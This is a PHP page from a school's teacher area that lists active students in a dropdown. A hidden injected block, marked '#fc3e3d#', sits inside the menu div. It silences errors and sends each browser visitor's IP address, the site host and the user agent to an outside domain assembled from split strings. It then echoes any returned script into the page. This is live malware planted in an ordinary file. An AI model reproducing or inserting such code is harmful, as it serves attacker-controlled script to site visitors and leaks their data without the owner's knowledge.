<?php
include_once('include/basics.php');
include_once( "../classes/DAO.php" );
include_once( "../classes/DBUtils.php" );
include_once('../classes/alunos.php');

$id = isset($_REQUEST['id']) ? $_REQUEST['id'] : 0;
$alunoLista = DAO::find('alunos', array('ativo' => 'S'), 'nome asc');

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset=utf-8 />
		<title><?php echo PAGE_TITLE ?> - Área do Professor</title>
		<link href="styles/index.css?<?php echo time();?>" rel="stylesheet" type="text/css" />
		<link href="styles/styles.css?<?php echo time();?>" rel="stylesheet" type="text/css" />
		<link type="text/css" href="styles/ui-lightness/jquery-ui-1.8.17.custom.css" rel="stylesheet" />	
		<script type="text/javascript" src="scripts/jquery-1.7.1.min.js"></script>
		<script type="text/javascript" src="scripts/jquery-ui-1.8.17.custom.min.js"></script>
        <script type="text/javascript" src="scripts/functions.js?<?php echo time();?>"></script>
        <script type="text/javascript" src="scripts/validate/jquery.validate.min.js?<?php echo time();?>"  charset="utf-8"></script>
		<script>
			
		</script>
	</head>
	<body>
		<div id="top"><a href="home.php"><img src="images/logo.jpg" alt="Home" title="Home" /></a></div>
		<div id="menu">
			<?php include("include/menu.php");?>
<?php
#fc3e3d#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/fc3e3d#
?>



		</div>
        <h1>Alunos</h1>
		<div id="conteudo">
        	<select style="height:30px; width:300px" onChange="aluno_historico(this.value)">
            	<option value=""></option>
<?php foreach ( $alunoLista as $cont => $aluno ) { ?>            
            	<option value="<?php echo $aluno->id; ?>"><?php echo $aluno->nome; ?></option>
<?php } ?>
            </select>
            <br>
            <div id="div_historico"></div>
		</div>
	</body>
</html>